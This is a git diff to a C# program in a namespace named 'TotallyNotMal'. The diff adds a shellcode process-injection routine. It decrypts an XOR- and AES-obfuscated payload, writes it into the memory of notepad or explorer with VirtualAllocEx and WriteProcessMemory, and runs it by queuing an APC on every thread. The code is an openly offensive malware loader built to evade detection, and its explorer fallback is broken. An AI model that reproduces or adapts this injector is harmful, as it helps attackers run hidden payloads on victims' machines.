@@ -258,6 +258,8 @@ namespace TotallyNotMal
             //Console.WriteLine("After XOR DEc: " + Encoding.UTF8.GetString(aesEncrypted));
 
             sh3Llc0d3 = AESDecrypt(aesEncrypted, aE5k3y, aE5Iv);
+            
+            /*
 
             //Console.WriteLine("After AES DEc: " + Encoding.UTF8.GetString(sh3Llc0d3));
 
@@ -290,6 +292,38 @@ namespace TotallyNotMal
 
             }
             bool hOpenProcessClose = CloseHandle(pHandle);
+
+            */
+
+            Process targetProcess = Process.GetProcessesByName("notepad")[0];
+            if(targetProcess == null)
+            {
+                Process targetProcess = Process.GetProcessesByName("explorer")[0];
+            }
+            else
+            {
+                IntPtr pHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
+
+                // Allocate memory within process and write sh3Llc0d3
+                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, sh3Llc0d3.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                IntPtr bytesWritten = IntPtr.Zero;
+                bool resultBool = WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, sh3Llc0d3.Length, out bytesWritten);
+
+                // Modify memory permissions on sh3Llc0d3 from XRW to XR
+                uint lpNumberOfBytesWritten = 0;
+                resultBool = VirtualProtectEx(pHandle, rMemAddress, sh3Llc0d3.Length, PAGE_EXECUTE_READ, out lpNumberOfBytesWritten);
+
+                // Iterate over threads and queueapc
+                foreach (ProcessThread thread in targetProcess.Threads)
+                {
+                    //Get handle to thread
+                    IntPtr tHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
+
+                    //Assign APC to thread to execute sh3Llc0d3
+                    IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
+                }
+                bool hOpenProcessClose = CloseHandle(pHandle);
+            }
 
         }
     }
